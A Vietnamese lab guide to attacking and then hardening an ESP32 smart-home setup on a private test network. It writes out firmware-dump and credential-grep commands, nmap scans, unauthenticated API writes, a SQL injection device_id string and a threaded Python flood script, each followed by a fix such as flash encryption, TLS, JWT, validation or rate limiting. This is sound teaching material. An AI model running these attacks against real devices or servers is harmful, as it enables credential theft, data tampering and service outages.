# 🔐 HƯỚNG DẪN CHI TIẾT: TẤN CÔNG & PHÒNG THỦ IoT

## ESP32 Smart Home Security - Practical Guide

---

## 📋 MỤC LỤC

1. [Chuẩn Bị Công Cụ](#-chuẩn-bị-công-cụ)
2. [Attack #1: Firmware Dump → Flash Encryption](#-attack-1-firmware-dump--credential-extraction)
3. [Attack #2: HTTP Sniffing → HTTPS/TLS](#-attack-2-http-traffic-sniffing)
4. [Attack #3: Unauthorized API → JWT Auth](#-attack-3-unauthorized-api-access)
5. [Attack #5+6: Data Injection + Anomaly → Validation + Detection](#-attack-56-fake-data-injection--sensor-spoofing)
6. [Attack #7: DoS/Brute Force → Rate Limiting](#-attack-7-dos--brute-force)

---

## 🛠️ CHUẨN BỊ CÔNG CỤ

### Công cụ cần cài đặt:

| Công Cụ | Mục Đích | Download |
|---------|----------|----------|
| **Wireshark** | Bắt và phân tích gói tin mạng | https://www.wireshark.org/download.html |
| **Nmap** | Quét mạng, phát hiện thiết bị và ports | https://nmap.org/download.html |
| **Postman** | Gửi HTTP requests, test API | https://www.postman.com/downloads/ |
| **esptool.py** | Dump firmware ESP32 | `pip install esptool` |

### Kiểm tra cài đặt:
```bash
# Kiểm tra nmap
nmap --version

# Kiểm tra esptool
esptool.py version

# Kiểm tra Wireshark (mở GUI)
wireshark
```

### Thông tin hệ thống demo:
```
ESP32 IP:     192.168.137.100 (hoặc IP thực của bạn)
Backend IP:   192.168.137.1
Backend Port: 5000
WiFi SSID:    "Bang"
```

---

# ⚔️ ATTACK #1: FIRMWARE DUMP → CREDENTIAL EXTRACTION

## 1.1 Mô Tả Tấn Công

**Mục tiêu**: Trích xuất WiFi password và API keys từ firmware ESP32

**Điều kiện**: Có physical access đến ESP32 (cắm USB)

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  Physical   │────▶│   Dump      │────▶│  Extract    │────▶│  Network    │
│  USB Access │     │  Firmware   │     │  Strings    │     │  Access     │
└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
```

## 1.2 Thực Hiện Tấn Công

### Bước 1: Kết nối ESP32 qua USB
```bash
# Xác định COM port (Windows)
# Mở Device Manager → Ports (COM & LPT) → Tìm "USB Serial"
# Ví dụ: COM3

# Hoặc dùng esptool để detect
esptool.py chip_id
```

**Output mong đợi:**
```
esptool.py v4.x
Serial port COM3
Connecting...
Detecting chip type... ESP32-S3
Chip ID: 0x12345678abcd
```

### Bước 2: Dump toàn bộ Flash Memory
```bash
# Dump 8MB flash (ESP32-S3)
esptool.py --chip esp32s3 --port COM3 read_flash 0x0 0x800000 firmware_dump.bin

# Hoặc cho ESP32 thường (4MB)
esptool.py --chip esp32 --port COM3 read_flash 0x0 0x400000 firmware_dump.bin
```

**Output mong đợi:**
```
Connecting...
Detecting chip type... ESP32-S3
Reading 8388608 bytes at 0x00000000... (100 %)
Read 8388608 bytes at 0x00000000 in 120.5 seconds (557.0 kbit/s)...
```

### Bước 3: Trích xuất Credentials
```bash
# Tìm WiFi credentials
strings firmware_dump.bin | grep -i -E "(ssid|wifi|password)" | head -20

# Tìm API keys
strings firmware_dump.bin | grep -i -E "(api|key|token|secret)" | head -20

# Tìm IP addresses
strings firmware_dump.bin | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | head -20
```

**Output mong đợi (VULNERABLE!):**
```
WIFI_SSID
Bang
WIFI_PASSWORD
12345678
API_KEY
sk_live_51234567890abcdef
API_URL
http://192.168.137.1:5000/api/sensor/data
```

### Bước 4: Sử dụng Credentials để truy cập mạng
```bash
# Windows - Kết nối WiFi
netsh wlan connect name="Bang"

# Verify kết nối
ipconfig
ping 192.168.137.1
```

## 1.3 Phòng Thủ: Flash Encryption + Secure Boot

### Giải pháp: Enable ESP32 Flash Encryption

**⚠️ CẢNH BÁO: Đây là one-time operation! Không thể undo!**

```bash
# 1. Generate encryption key
espsecure.py generate_flash_encryption_key my_flash_key.bin

# 2. Burn key vào eFuse (PERMANENT!)
espefuse.py --port COM3 burn_key BLOCK_KEY0 my_flash_key.bin XTS_AES_128_KEY

# 3. Enable flash encryption
espefuse.py --port COM3 burn_efuse SPI_BOOT_CRYPT_CNT 1
```

### Thay đổi trong code (platformio.ini):
```ini
; Enable flash encryption
build_flags = 
    -DCONFIG_FLASH_ENCRYPTION_ENABLED=1
    -DCONFIG_SECURE_BOOT_V2_ENABLED=1
```

### Kết quả sau khi phòng thủ:
```bash
# Thử dump lại
esptool.py --port COM3 read_flash 0x0 0x400000 encrypted_dump.bin
strings encrypted_dump.bin | grep -i password

# Output: (garbage data - không đọc được!)
# ²¥ñÿ×Ëð¿...
```

---

# ⚔️ ATTACK #2: HTTP TRAFFIC SNIFFING

## 2.1 Mô Tả Tấn Công

**Mục tiêu**: Bắt gói tin HTTP để đọc sensor data và API credentials

**Công cụ**: Wireshark

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   ESP32     │────▶│   WiFi      │────▶│  Wireshark  │────▶│  Data       │
│  Sends Data │     │  Network    │     │  Capture    │     │  Exposed    │
└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
```

## 2.2 Thực Hiện Tấn Công

### Bước 1: Khởi động Wireshark
1. Mở Wireshark
2. Chọn network interface (WiFi adapter)
3. Click "Start capturing"

### Bước 2: Filter HTTP traffic
Nhập filter trong Wireshark:
```
http and ip.addr == 192.168.137.1
```

Hoặc filter chi tiết hơn:
```
http.request.method == "POST" and ip.addr == 192.168.137.100
```

### Bước 3: Phân tích captured packets

**Click vào packet → Follow → HTTP Stream**

**Output mong đợi (VULNERABLE!):**
```http
POST /api/sensor/data HTTP/1.1
Host: 192.168.137.1:5000
Content-Type: application/json
Authorization: Bearer sk_live_51234567890abcdef

{
    "device_id": "esp32_001",
    "temperature": 25.5,
    "humidity": 60.2,
    "light": 45.0,
    "timestamp": 1704672000
}
```

**→ Attacker thấy được: API key, sensor data, device ID!**

### Bước 4: Screenshot bằng chứng
- File → Export Packet Dissections → As Plain Text
- Hoặc screenshot HTTP stream

## 2.3 Phòng Thủ: HTTPS/TLS Implementation

### Backend - Tạo SSL Certificate:
```bash
# Tạo self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Nhập thông tin khi được hỏi
# Common Name: 192.168.137.1 (IP của server)
```

### Backend - Sửa simple_server.py:
```python
from flask import Flask
import ssl

app = Flask(__name__)

# ... existing routes ...

if __name__ == '__main__':
    # HTTPS với SSL context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('cert.pem', 'key.pem')
    
    app.run(host='0.0.0.0', port=443, ssl_context=context, debug=False)
```

### ESP32 - Sửa main.cpp:
```cpp
#include <WiFiClientSecure.h>

// Root CA Certificate (copy từ cert.pem)
const char* root_ca = \
"-----BEGIN CERTIFICATE-----\n" \
"MIIDrzCCApegAwIBAgIQC...\n" \
"-----END CERTIFICATE-----\n";

WiFiClientSecure client;

void setup() {
    // ... WiFi setup ...
    client.setCACert(root_ca);
}

void sendDataHTTPS() {
    if (client.connect("192.168.137.1", 443)) {
        // HTTPS request
        client.println("POST /api/sensor/data HTTP/1.1");
        client.println("Host: 192.168.137.1");
        // ... rest of request
    }
}
```

### Kết quả sau phòng thủ (Wireshark):
```
Protocol: TLSv1.2
Info: Application Data (encrypted)
Data: 17 03 03 00 45 00 00 00 00 00 00 00 01 8c 4e 51...
```
**→ Attacker chỉ thấy encrypted data, không đọc được nội dung!**

---

# ⚔️ ATTACK #3: UNAUTHORIZED API ACCESS

## 3.1 Mô Tả Tấn Công

**Mục tiêu**: Truy cập API endpoints mà không cần authentication

**Công cụ**: Nmap + Postman

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   Nmap      │────▶│   Find      │────▶│  Postman    │────▶│  Data       │
│   Scan      │     │   Port 5000 │     │  API Test   │     │  Access     │
└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
```

## 3.2 Thực Hiện Tấn Công

### Bước 1: Reconnaissance với Nmap

```bash
# Scan network tìm devices
nmap -sn 192.168.137.0/24

# Output:
# Nmap scan report for 192.168.137.1
# Host is up (0.0012s latency).
# Nmap scan report for 192.168.137.100
# Host is up (0.0050s latency).
```

```bash
# Scan ports trên backend server
nmap -sV 192.168.137.1 -p 1-10000

# Output:
# PORT     STATE SERVICE VERSION
# 5000/tcp open  http    Werkzeug httpd 2.0.1 (Python 3.9.7)
```

```bash
# Aggressive scan để tìm thêm thông tin
nmap -A 192.168.137.1 -p 5000

# Output:
# 5000/tcp open  http
# |_http-title: ESP32 Smart Home Dashboard
# | http-methods: GET, POST, OPTIONS
```

### Bước 2: API Discovery với Postman

**Tạo Collection trong Postman:**

1. **GET Devices List**
   - URL: `http://192.168.137.1:5000/api/devices`
   - Method: GET
   - Headers: (none required!)
   
   **Response (VULNERABLE!):**
   ```json
   {
       "devices": ["esp32_001", "esp32_002"]
   }
   ```

2. **GET Latest Sensor Data**
   - URL: `http://192.168.137.1:5000/api/sensor/latest/esp32_001`
   - Method: GET
   
   **Response:**
   ```json
   {
       "device_id": "esp32_001",
       "temperature": 25.5,
       "humidity": 60.2,
       "light": 45.0,
       "received_at": "2026-01-07 18:30:00"
   }
   ```

3. **POST Inject Fake Data**
   - URL: `http://192.168.137.1:5000/api/sensor/data`
   - Method: POST
   - Headers: `Content-Type: application/json`
   - Body:
   ```json
   {
       "device_id": "HACKED_DEVICE",
       "temperature": 999.9,
       "humidity": 999.9,
       "light": 100
   }
   ```
   
   **Response (VULNERABLE!):**
   ```json
   {
       "status": "success",
       "device_id": "HACKED_DEVICE"
   }
   ```

**→ Không cần authentication! Ai cũng có thể đọc/ghi data!**

### Bước 3: Screenshot trong Postman
- Click "Send" → Screenshot response
- Export Collection as JSON

## 3.3 Phòng Thủ: JWT Authentication

### Backend - Cài đặt dependencies:
```bash
pip install flask-jwt-extended
```

### Backend - Thêm JWT vào simple_server.py:
```python
from flask import Flask, request, jsonify
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, get_jwt_identity
import datetime

app = Flask(__name__)

# JWT Configuration
app.config['JWT_SECRET_KEY'] = 'your-secret-key-change-in-production'
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = datetime.timedelta(days=30)
jwt = JWTManager(app)

# Device credentials database (simple version)
DEVICE_CREDENTIALS = {
    'esp32_001': 'device_secret_001',
    'esp32_002': 'device_secret_002'
}

# ============ AUTHENTICATION ENDPOINTS ============

@app.route('/api/auth/token', methods=['POST'])
def get_token():
    """Get JWT token for device"""
    data = request.get_json()
    device_id = data.get('device_id')
    device_secret = data.get('device_secret')
    
    # Validate credentials
    if device_id in DEVICE_CREDENTIALS:
        if DEVICE_CREDENTIALS[device_id] == device_secret:
            token = create_access_token(identity=device_id)
            return jsonify({'token': token}), 200
    
    return jsonify({'error': 'Invalid credentials'}), 401

# ============ PROTECTED ENDPOINTS ============

@app.route('/api/sensor/data', methods=['POST'])
@jwt_required()  # 🛡️ REQUIRES JWT TOKEN
def receive_sensor_data():
    current_device = get_jwt_identity()
    data = request.get_json()
    
    # Verify device_id matches token
    if data.get('device_id') != current_device:
        return jsonify({'error': 'Device ID mismatch'}), 403
    
    # Process data...
    return jsonify({'status': 'success'}), 200

@app.route('/api/sensor/latest/<device_id>', methods=['GET'])
@jwt_required()  # 🛡️ REQUIRES JWT TOKEN
def get_latest_data(device_id):
    # ... existing code ...
    pass

@app.route('/api/devices', methods=['GET'])
@jwt_required()  # 🛡️ REQUIRES JWT TOKEN
def list_devices():
    # ... existing code ...
    pass
```

### Kết quả sau phòng thủ (Postman):

**Không có token:**
```
GET /api/devices
Response: 401 Unauthorized
{
    "msg": "Missing Authorization Header"
}
```

**Với token hợp lệ:**
```
GET /api/devices
Headers: Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Response: 200 OK
{
    "devices": ["esp32_001"]
}
```

---

# ⚔️ ATTACK #5+6: FAKE DATA INJECTION + SENSOR SPOOFING

## 5.1 Mô Tả Tấn Công

**Mục tiêu kết hợp**: 
- (#5) Inject dữ liệu giả qua API (temperature=999°C)
- (#6) Thay đổi vật lý sensor (che LDR) để tạo readings bất thường

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    COMBINED ATTACK SCENARIO                               │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ATTACK #5: API Data Injection          ATTACK #6: Physical Spoofing    │
│  ┌─────────────────────────────┐        ┌─────────────────────────────┐ │
│  │ Postman sends:              │        │ Attacker covers LDR:        │ │
│  │ temperature: 999            │        │ Light: 50% → 0% instantly   │ │
│  │ humidity: -50               │        │                             │ │
│  └─────────────┬───────────────┘        └─────────────┬───────────────┘ │
│                │                                      │                  │
│                ▼                                      ▼                  │
│  ┌─────────────────────────────────────────────────────────────────────┐│
│  │                         BACKEND SERVER                               ││
│  │  🛡️ INPUT VALIDATION          🛡️ ANOMALY DETECTION                 ││
│  │  - Range check (-40 to 80°C)   - Statistical z-score                ││
│  │  - Type validation             - Rate-of-change check              ││
│  │  - Format validation           - Historical comparison             ││
│  └─────────────────────────────────────────────────────────────────────┘│
│                │                                      │                  │
│                ▼                                      ▼                  │
│         400 Bad Request                    ⚠️ Warning: Anomaly          │
│         "Temperature out of range"         "Rapid change detected"      │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

## 5.2 Thực Hiện Tấn Công #5: Data Injection (Postman)

### Bước 1: Inject dữ liệu ngoài phạm vi

**Trong Postman:**
- Method: POST
- URL: `http://192.168.137.1:5000/api/sensor/data`
- Headers: `Content-Type: application/json`
- Body:
```json
{
    "device_id": "esp32_001",
    "temperature": 999.9,
    "humidity": -50,
    "light": 150,
    "timestamp": 1704672000
}
```

**Response hiện tại (VULNERABLE!):**
```json
{
    "status": "success",
    "device_id": "esp32_001"
}
```
**→ Dữ liệu 999.9°C được chấp nhận!**

### Bước 2: Inject device ID không hợp lệ
```json
{
    "device_id": "'; DROP TABLE sensor_readings;--",
    "temperature": 25.5
}
```

### Bước 3: Inject dữ liệu sai kiểu
```json
{
    "device_id": "esp32_001",
    "temperature": "not_a_number",
    "humidity": null
}
```

## 5.3 Thực Hiện Tấn Công #6: Physical Sensor Spoofing

### Bước 1: Baseline Reading
Ghi lại readings bình thường:
```
Temperature: 25°C
Humidity: 60%
Light: 50%
```

### Bước 2: Physical Manipulation

**Thí nghiệm 1 - Che LDR:**
- Dùng tay hoặc vật để che kín LDR sensor
- Quan sát Dashboard: Light drops 50% → 0% ngay lập tức

**Thí nghiệm 2 - Chiếu sáng LDR:**
- Dùng đèn flash điện thoại chiếu vào LDR
- Quan sát Dashboard: Light jumps 50% → 100%

**Thí nghiệm 3 - Nung nóng DHT11:**
- Dùng máy sấy/lighter (CẨN THẬN!) gần DHT11
- Quan sát: Temperature rises 25°C → 40°C+ nhanh chóng

### Bước 3: Screenshot Evidence
- Chụp Dashboard trước/sau manipulation
- Record video nếu có

## 5.4 Phòng Thủ: Input Validation + Anomaly Detection

### Backend - Thêm Validation & Detection vào simple_server.py:

```python
import re
import statistics
from collections import deque
import time

# ============ VALIDATION CONSTANTS ============
VALID_RANGES = {
    'temperature': (-40, 80),      # DHT11/22 range
    'humidity': (0, 100),          # Percentage
    'light': (0, 100),             # Percentage
}

DEVICE_ID_PATTERN = re.compile(r'^[a-zA-Z0-9_]{3,20}$')

# ============ ANOMALY DETECTION CLASS ============
class AnomalyDetector:
    def __init__(self, window_size=10, z_threshold=3, max_change_rate=None):
        self.history = {}
        self.window_size = window_size
        self.z_threshold = z_threshold
        self.max_change_rate = max_change_rate or {
            'temperature': 5,   # Max 5°C change per reading
            'humidity': 15,     # Max 15% change per reading
            'light': 50         # Max 50% change per reading (light can change fast)
        }
    
    def get_history(self, device_id, sensor_type):
        key = f"{device_id}_{sensor_type}"
        if key not in self.history:
            self.history[key] = deque(maxlen=self.window_size)
        return self.history[key]
    
    def check(self, device_id, sensor_type, value):
        """Returns (is_anomaly, reason)"""
        history = self.get_history(device_id, sensor_type)
        warnings = []
        
        # Check 1: Rate of change
        if len(history) > 0:
            last_value = history[-1]
            change = abs(value - last_value)
            max_allowed = self.max_change_rate.get(sensor_type, 10)
            
            if change > max_allowed:
                warnings.append(f"Rapid change: {last_value:.1f} → {value:.1f} (Δ{change:.1f} > {max_allowed})")
        
        # Check 2: Statistical anomaly (z-score)
        if len(history) >= 5:
            mean = statistics.mean(history)
            std = statistics.stdev(history)
            if std > 0:
                z_score = abs(value - mean) / std
                if z_score > self.z_threshold:
                    warnings.append(f"Statistical anomaly: z-score={z_score:.2f} (threshold={self.z_threshold})")
        
        # Add to history if not severe anomaly
        if not warnings:
            history.append(value)
        
        return len(warnings) > 0, warnings

# Global detector instance
detector = AnomalyDetector()

# ============ VALIDATION FUNCTION ============
def validate_sensor_data(data):
    """Validate all sensor data fields"""
    errors = []
    
    # 1. Validate device_id
    device_id = data.get('device_id', '')
    if not device_id:
        errors.append("device_id is required")
    elif not DEVICE_ID_PATTERN.match(str(device_id)):
        errors.append(f"Invalid device_id format: {device_id}")
    
    # 2. Validate numeric ranges
    for field, (min_val, max_val) in VALID_RANGES.items():
        value = data.get(field)
        if value is not None:
            try:
                value = float(value)
                if value < min_val or value > max_val:
                    errors.append(f"{field}={value} out of range [{min_val}, {max_val}]")
            except (TypeError, ValueError):
                errors.append(f"{field} must be a number, got: {type(value).__name__}")
    
    # 3. Validate timestamp
    timestamp = data.get('timestamp')
    if timestamp:
        try:
            ts = int(timestamp)
            now = int(time.time())
            if ts < now - 86400:  # More than 24 hours old
                errors.append(f"Timestamp too old: {ts}")
            elif ts > now + 300:  # More than 5 minutes in future
                errors.append(f"Timestamp in future: {ts}")
        except:
            errors.append(f"Invalid timestamp format: {timestamp}")
    
    return errors

# ============ COMBINED VALIDATION + ANOMALY ENDPOINT ============
@app.route('/api/sensor/data', methods=['POST'])
def receive_sensor_data():
    data = request.get_json()
    
    if not data:
        return jsonify({'status': 'error', 'message': 'No JSON data'}), 400
    
    # 🛡️ STEP 1: INPUT VALIDATION
    validation_errors = validate_sensor_data(data)
    if validation_errors:
        return jsonify({
            'status': 'error',
            'message': 'Validation failed',
            'errors': validation_errors
        }), 400
    
    # 🛡️ STEP 2: ANOMALY DETECTION
    device_id = data.get('device_id')
    anomaly_warnings = []
    
    for sensor in ['temperature', 'humidity', 'light']:
        value = data.get(sensor)
        if value is not None:
            is_anomaly, warnings = detector.check(device_id, sensor, float(value))
            if is_anomaly:
                anomaly_warnings.extend([f"{sensor}: {w}" for w in warnings])
    
    # Log anomalies but still accept data
    if anomaly_warnings:
        print(f"⚠️ ANOMALY DETECTED for {device_id}: {anomaly_warnings}")
        # In production: send alert, log to security system
        
        return jsonify({
            'status': 'warning',
            'message': 'Data accepted with anomaly warnings',
            'warnings': anomaly_warnings
        }), 202
    
    # 🛡️ STEP 3: SAVE VALID DATA
    # ... existing database code ...
    
    return jsonify({'status': 'success', 'device_id': device_id}), 200
```

## 5.5 Kết Quả Sau Phòng Thủ (Test với Postman)

### Test 1: Giá trị ngoài phạm vi
```json
// Request
{
    "device_id": "esp32_001",
    "temperature": 999.9,
    "humidity": -50
}

// Response: 400 Bad Request
{
    "status": "error",
    "message": "Validation failed",
    "errors": [
        "temperature=999.9 out of range [-40, 80]",
        "humidity=-50 out of range [0, 100]"
    ]
}
```

### Test 2: Device ID không hợp lệ (SQL Injection attempt)
```json
// Request
{
    "device_id": "'; DROP TABLE--",
    "temperature": 25
}

// Response: 400 Bad Request
{
    "status": "error",
    "message": "Validation failed",
    "errors": [
        "Invalid device_id format: '; DROP TABLE--"
    ]
}
```

### Test 3: Thay đổi bất thường (Sensor spoofing)
```json
// Request 1: Normal
{"device_id": "esp32_001", "temperature": 25, "light": 50}
// Response: 200 OK

// Request 2: Sudden change (LDR covered)
{"device_id": "esp32_001", "temperature": 25, "light": 0}
// Response: 202 Accepted (with warning)
{
    "status": "warning",
    "message": "Data accepted with anomaly warnings",
    "warnings": [
        "light: Rapid change: 50.0 → 0.0 (Δ50.0 > 50)"
    ]
}
```

---

# ⚔️ ATTACK #7: DoS / BRUTE FORCE

## 7.1 Mô Tả Tấn Công

**Mục tiêu**: Làm server quá tải bằng cách gửi nhiều requests

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  Attacker   │────▶│  1000 req/s │────▶│  Server     │
│  Script     │     │  to API     │     │  Crash!     │
└─────────────┘     └─────────────┘     └─────────────┘
```

## 7.2 Thực Hiện Tấn Công

### Bước 1: DoS với PowerShell
```powershell
# Simple DoS - 100 requests
1..100 | ForEach-Object {
    Invoke-WebRequest -Uri "http://192.168.137.1:5000/api/devices" -Method GET
    Write-Host "Request $_"
}
```

### Bước 2: DoS với Python
```python
import requests
import threading
import time

TARGET = "http://192.168.137.1:5000/api/sensor/data"
PAYLOAD = {"device_id": "dos_test", "temperature": 25}

def send_request():
    try:
        requests.post(TARGET, json=PAYLOAD, timeout=5)
    except:
        pass

# Send 1000 requests
print("Starting DoS attack...")
start = time.time()

threads = []
for i in range(1000):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print(f"Completed in {time.time() - start:.2f}s")
```

### Bước 3: Brute Force API với nhiều payloads (Postman)
- Import Collection với 100+ requests
- Run Collection với iteration=100

**Kết quả (VULNERABLE):** Server chậm hoặc crash!

## 7.3 Phòng Thủ: Rate Limiting

### Backend - Cài đặt Flask-Limiter:
```bash
pip install flask-limiter
```

### Backend - Thêm Rate Limiting:
```python
from flask import Flask
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

# 🛡️ RATE LIMITER CONFIGURATION
limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

# Strict limit for data submission
@app.route('/api/sensor/data', methods=['POST'])
@limiter.limit("10 per minute")  # Max 10 requests per minute
def receive_sensor_data():
    # ... existing code ...
    pass

# Moderate limit for reading
@app.route('/api/sensor/latest/<device_id>', methods=['GET'])
@limiter.limit("30 per minute")
def get_latest_data(device_id):
    # ... existing code ...
    pass

# Very strict for auth
@app.route('/api/auth/token', methods=['POST'])
@limiter.limit("5 per minute")  # Prevent brute force
def get_token():
    # ... existing code ...
    pass

# Custom error handler
@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        'status': 'error',
        'message': 'Rate limit exceeded',
        'retry_after': e.description
    }), 429
```

## 7.4 Kết Quả Sau Phòng Thủ

### Test Rate Limiting với Postman:
```
Request 1-10: 200 OK
Request 11: 429 Too Many Requests
{
    "status": "error",
    "message": "Rate limit exceeded",
    "retry_after": "1 minute"
}
```

### Test với PowerShell:
```powershell
1..15 | ForEach-Object {
    $response = Invoke-WebRequest -Uri "http://192.168.137.1:5000/api/sensor/data" -Method POST -Body '{"device_id":"test"}' -ContentType "application/json"
    Write-Host "Request $_`: $($response.StatusCode)"
}

# Output:
# Request 1: 200
# ...
# Request 10: 200
# Request 11: 429
# Request 12: 429
# ...
```

---

# 📊 BẢNG TÓM TẮT CUỐI CÙNG

| # | Tấn Công | Tool | Phòng Thủ | Verify |
|---|----------|------|-----------|--------|
| 1 | Firmware Dump | esptool.py | Flash Encryption | strings returns garbage |
| 2 | HTTP Sniffing | Wireshark | HTTPS/TLS | Traffic shows "Encrypted" |
| 3 | Unauthorized API | Nmap + Postman | JWT Auth | 401 without token |
| 5 | Fake Data | Postman | Input Validation | 400 for invalid data |
| 6 | Sensor Spoofing | Physical | Anomaly Detection | Warning in response |
| 7 | DoS Attack | Script | Rate Limiting | 429 after limit |

---

## ✅ CHECKLIST HOÀN THÀNH

- [ ] Cài đặt Wireshark, Nmap, Postman
- [ ] Demo Attack #1 - Firmware Dump
- [ ] Demo Attack #2 - HTTP Sniffing (Wireshark)
- [ ] Demo Attack #3 - API Access (Nmap + Postman)
- [ ] Demo Attack #5+6 - Data Injection + Sensor Spoof
- [ ] Demo Attack #7 - DoS
- [ ] Implement Flash Encryption (optional - destructive)
- [ ] Implement HTTPS
- [ ] Implement JWT Auth
- [ ] Implement Input Validation
- [ ] Implement Anomaly Detection
- [ ] Implement Rate Limiting
- [ ] Screenshot/Record tất cả tests

---

> **Ngày tạo**: 07/01/2026  
> **Dự án**: ESP32 Smart Home IoT Security  
> **⚠️ CẢNH BÁO**: Chỉ sử dụng trong môi trường lab có sự cho phép!
